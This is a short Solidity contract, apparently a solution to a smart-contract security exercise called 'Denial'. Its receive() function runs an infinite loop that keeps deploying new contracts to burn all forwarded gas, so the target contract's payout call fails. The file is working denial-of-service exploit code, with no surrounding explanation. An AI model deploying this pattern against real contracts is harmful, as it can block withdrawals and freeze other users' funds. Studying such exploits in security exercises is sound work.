// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        while (true) {
            // gas intensive just to reduce test time:
            // CREATE opcode minimum gas = 32000
            Denial d = new Denial();
        }
    }
}
